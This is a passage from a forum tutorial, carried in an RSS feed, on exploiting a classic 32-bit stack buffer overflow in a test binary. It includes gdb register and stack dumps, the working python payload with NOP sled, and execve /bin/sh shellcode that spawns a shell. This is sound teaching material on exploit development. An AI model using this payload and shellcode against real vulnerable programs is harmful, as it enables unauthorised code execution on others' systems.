[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd000 ('C' &lt;repeats 144 times&gt;)
EDX: 0xffffd08e --&gt; 0xd0004343 
ESI: 0xf7f9a000 --&gt; 0x1cfd70 
EDI: 0x0 
EBP: 0x0 
ESP: 0xffffd000 ('C' &lt;repeats 144 times&gt;)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
</code></pre>
<p>And oberving our stack, we have our 144 C’s starting</p>
<pre><code class="lang-auto">[------------------------------------stack-------------------------------------]
0000| 0xffffd000 ('C' &lt;repeats 144 times&gt;)
0004| 0xffffd004 ('C' &lt;repeats 140 times&gt;)
0008| 0xffffd008 ('C' &lt;repeats 136 times&gt;)
0012| 0xffffd00c ('C' &lt;repeats 132 times&gt;)
0016| 0xffffd010 ('C' &lt;repeats 128 times&gt;)
0020| 0xffffd014 ('C' &lt;repeats 124 times&gt;)
0024| 0xffffd018 ('C' &lt;repeats 120 times&gt;)
0028| 0xffffd01c ('C' &lt;repeats 116 times&gt;)
</code></pre>
<p>Great so we’ve gained control of <code>EIP</code> evidenced by it being set to <code>0x42424242</code>, all we need to do now is execute some code. You’ll notice that the space we determined the size of after our overwritten <code>EIP</code> is only going to allow us <code>144-bytes</code> to work with. To be clear this is the start of our <code>ESP</code> (extended stack pointer) which points to the top of our stack, however, keep in mind the stack grows towards lower memory.</p>
<p>To get an idea of the layout in memory you can use <code>info proc m</code> or <code>vm</code></p>
<pre><code class="lang-auto">gdb-peda$ info proc map
process 70832
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/dostoevsky/example/test
	 0x8049000  0x804a000     0x1000        0x0 /home/dostoevsky/example/test
	0xf7dca000 0xf7f97000   0x1cd000        0x0 /lib32/libc-2.26.so
	0xf7f97000 0xf7f98000     0x1000   0x1cd000 /lib32/libc-2.26.so
	0xf7f98000 0xf7f9a000     0x2000   0x1cd000 /lib32/libc-2.26.so
	0xf7f9a000 0xf7f9b000     0x1000   0x1cf000 /lib32/libc-2.26.so
	0xf7f9b000 0xf7f9e000     0x3000        0x0 
	0xf7fd0000 0xf7fd2000     0x2000        0x0 
	0xf7fd2000 0xf7fd5000     0x3000        0x0 [vvar]
	0xf7fd5000 0xf7fd7000     0x2000        0x0 [vdso]
	0xf7fd7000 0xf7ffc000    0x25000        0x0 /lib32/ld-2.26.so
	0xf7ffc000 0xf7ffd000     0x1000    0x24000 /lib32/ld-2.26.so
	0xf7ffd000 0xf7ffe000     0x1000    0x25000 /lib32/ld-2.26.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
</code></pre>
<p>Since we have 144-bytes to work with in our buffer, we will write our shellcode here. For this reason we will jump to the start of <code>ESP</code>, and as we know the instruction pointer points to the next address in memory to jump and execute. So, we will point it to our <code>ESP</code> (the start of our "C"s)</p>
<pre><code class="lang-auto">gdb-peda$ x $esp
0xffffd000:	'C' &lt;repeats 144 times&gt;
</code></pre>
<p>However, this is using <code>0x00</code> which is generally used for string termination and will be considered a bad character. You can learn more about bad characters in the write-up by <a href="http://ch3rn0byl.com" rel="noopener nofollow ugc">ch3rn0byl</a> linked in the <a href="https://d.clarkee.co.uk#practice-makes-slightly-better">practice</a> section later.</p>
<p>Luckily, we have <code>144-bytes</code> to work with so giving up <code>1-byte</code> isn’t a big deal.</p>
<pre><code class="lang-auto">gdb-peda$ x $esp+1
0xffffd001:	'C' &lt;repeats 143 times&gt;
</code></pre>
<p>Let’s try it out using the <code>\xCC</code> trap instruction, and our return address of <code>0xffffd001</code>. First let’s put it in little-endian notation: <code>\x01\xd0\xff\xff</code>. Essentially the trap instruction will halt our execution but let us know code execution is possible if it falls into the trap.</p>
<pre><code class="lang-auto">gdb-peda$ r `python -c "print 'A' * 108 + '\x01\xd0\xff\xff' + '\xCC' * (256 - 108 - 4)"`
Starting program: /home/dostoevsky/example/test `python -c "print 'A' * 108 + '\x01\xd0\xff\xff' + '\xCC' * (256 - 108 - 4)"`

Program received signal SIGTRAP, Trace/breakpoint trap.
</code></pre>
<p>Great so we hit our SIGTRAP, and our registers look like this, notice <code>ECX</code>, <code>ESP</code>, and <code>EIP</code> point to <code>0xcccccccc</code>. Also notice that <code>EIP</code> is set to our <code>0xffffd002</code>, it jumped to our <code>EIP</code> of <code>0xffffd001</code> and then fell into our trap of <code>0xCC</code>.</p>
<pre><code class="lang-auto">[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd000 --&gt; 0xcccccccc 
EDX: 0xffffd08e --&gt; 0xd000cccc 
ESI: 0xf7f9a000 --&gt; 0x1cfd70 
EDI: 0x0 
EBP: 0x0 
ESP: 0xffffd000 --&gt; 0xcccccccc 
EIP: 0xffffd002 --&gt; 0xcccccccc
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
</code></pre>
<p>Lastly, our stack layout now looks like this</p>
<pre><code class="lang-auto">[------------------------------------stack-------------------------------------]
0000| 0xffffd000 --&gt; 0xcccccccc 
0004| 0xffffd004 --&gt; 0xcccccccc 
0008| 0xffffd008 --&gt; 0xcccccccc 
0012| 0xffffd00c --&gt; 0xcccccccc 
0016| 0xffffd010 --&gt; 0xcccccccc 
0020| 0xffffd014 --&gt; 0xcccccccc 
0024| 0xffffd018 --&gt; 0xcccccccc 
0028| 0xffffd01c --&gt; 0xcccccccc 
</code></pre>
<pre><code class="lang-auto">Note: Never use shellcode if you don't know what it does.
</code></pre>
<p>Great so we know code execution is possible, and we know that we have <code>143-bytes</code> to work with. We can just use <a href="http://shell-storm.org/shellcode/files/shellcode-61.php" rel="noopener nofollow ugc">this</a> short payload of only <code>28-bytes</code> from shell-storm:</p>
<pre><code class="lang-auto">\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80
</code></pre>
<p>Now, we need to figure out where to put this.</p>
<p><a name="putting-it-all-together"></a></p>
<h2><a name="p-21029-putting-it-all-together-17" class="anchor" href="https://d.clarkee.co.uk#p-21029-putting-it-all-together-17"></a>Putting it all together</h2>
<p>Now, all we need to do is jump to this address and replace our traps with our shellcode.</p>
<p>We need to fill up this buffer with padding so that the shell code takes up <code>28-bytes</code> and the padding takes up the remaining <code>144-bytes</code> just like we did with our trap earlier. Remember the math for this padding is <code>256 (buffer) - 108 (offset) - 4 (EIP) - 28 (shellcode)</code>. This will be fairly easy to construct, first we will use a concept referred to as a nopsled to slide into our shellcode, we’ll fill up the start of our space with <code>\0x90</code> (no operations) and when we jump to it, our stack will just jump over each <code>NOP</code> until it hits our shellcode. It will be something in the order of <code>[Buffer][EIP][NOPSled][Shellcode]</code>, where our nopsled and shellcode act as our padding. It will look like this:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/8/8284aa24db0afa7f32e479280ee4c82510fbdea3.png" data-download-href="/uploads/short-url/iCCiPPxX7q22cOXQsQkbUvdPIS7.png?dl=1" title="Getting cozy with exploit development" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/8/8284aa24db0afa7f32e479280ee4c82510fbdea3.png" alt="Getting cozy with exploit development" width="690" height="236"></a></div><p></p>
<p>Let’s try it out!</p>
<pre><code class="lang-auto">gdb-peda$ r `python -c "print 'A' * 108 + '\x01\xd0\xff\xff' + '\x90' * (256 - 108 - 4 - 28) + '\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'"`
Starting program: /home/dostoevsky/example/test `python -c "print 'A' * 108 + '\x01\xd0\xff\xff' + '\x90' * (256 - 108 - 4 - 28) + '\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'"`
process 70842 is executing new program: /bin/dash
$ id
[New process 70844]
process 70844 is executing new program: /usr/bin/id
uid=1000(dostoevsky) gid=1000(dostoevsky) groups=1000(dostoevsky),27(sudo)
</code></pre>
<p>Great it works in <code>gdb</code>! Now let’s try to run it on our command line to make sure everything lines up correctly.</p>
<pre><code class="lang-auto">➜  ./test `python -c "print 'A' * 108 + '\x01\xd0\xff\xff' + '\x90' * (256 - 108 - 4 - 28) + '\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'"`
[1]    70865 segmentation fault  ./test 
</code></pre>
<p>Notice it fails if we try to run it, this is because of those environmental variables we mentioned earlier. In gdb the environmental variables it sets use the full path to the binary, even if you don’t supply it, so here we must also use the full path to make everything line up in memory.</p>
<p>You can observe the difference in the arguments (remember the command we run is also an argument within bash) by using <code>strace</code>:</p>
<pre><code class="lang-auto">➜  strace ./test
execve("./test", ["./test"], 0x7fffffffe120 /* 52 vars */) = 0
</code></pre>
<p>versus</p>
<pre><code class="lang-auto">➜  strace /home/dostoevsky/example/test
execve("/home/dostoevsky/example/test", ["/home/dostoevsky/example/test"], 0x7fffffffe110 /* 52 vars */) = 0
</code></pre>
<p>So let’s try that again with the full path:</p>
<pre><code class="lang-auto">➜  /home/dostoevsky/example/test `python -c "print 'A' * 108 + '\x01\xd0\xff\xff' + '\x90' * (256 - 108 - 4 - 28) + '\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'"`
$ id
uid=1000(dostoevsky) gid=1000(dostoevsky) groups=1000(dostoevsky),27(sudo)
</code></pre>
<p>And voila, just like that we have code execution like its 1999 again! Obviously, in modern exploitation, there has been significant advances in memory protections.<br>
Therefore, this approach <em>should</em> no longer be possible.</p>
<p>However, hopefully you have gained some insight of how this all works. This will make adapting to different scenarios and environments easier.</p>
<p><a name="practice-makes-slightly-better"></a></p>
<h2><a name="p-21029-practice-makes-slightly-better-18" class="anchor" href="https://d.clarkee.co.uk#p-21029-practice-makes-slightly-better-18"></a>Practice makes slightly better</h2>
<p>One of my favorite quotes is by Isaac Newton where he said:</p>
<blockquote>
<p>If I have seen further it is by standing on ye sholders of Giants</p>
</blockquote>
<p>This couldn’t be truer of exploit development, we are able to continue research and advance our techniques because the experts before us were kind enough to share their research and give us a boost to the high chair. We are but children in this field, respect that, put in the work and it will pay off.</p>
<p>Essentially you need to learn how to dance around in memory, there is no better way to do this than to just get your hands dirty.</p>
<p>Practice these basic concepts using some of these write-ups, but in addition to that just jump in your debugger and move around memory until you understand what is going on.</p>
<p><a href="http://phrack.org/issues/49/14.html" rel="noopener nofollow ugc">Phrack 49 - Smashing The Stack For Fun And Profit</a></p>
<p><a href="https://paulmakowski.wordpress.com/2011/01/25/smashing-the-stack-in-2011/" rel="noopener nofollow ugc">My 20% - Smashing the Stack in 2011</a></p>
<p><a href="https://avicoder.me/2016/02/01/smashsatck-revived/" rel="noopener nofollow ugc">Whiskey Tango Foxtrot - Smashing the Stack for Fun &amp; Profit : Revived</a></p>
<p><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" rel="noopener nofollow ugc">Corelan Team - Exploit writing tutorial part 1 : Stack Based Overflows</a></p>
<p><a href="http://ch3rn0byl.com/intro-to-buffer-overflows/" rel="noopener nofollow ugc">ch3rn0byl - Intro to Buffer Overflows</a></p>
<p><a href="http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html" rel="noopener nofollow ugc">The Grey Corner - Stack Based Windows Buffer Overflow Tutorial</a></p>
<p>Hope the content of this post helps you to bridge the gap too!</p>
          <p><a href="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/1</link>
        <pubDate>Sun, 04 Feb 2018 16:32:01 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-5311-1</guid>
        <source url="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311.rss">Getting cozy with exploit development</source>
      </item>
  </channel>
</rss>
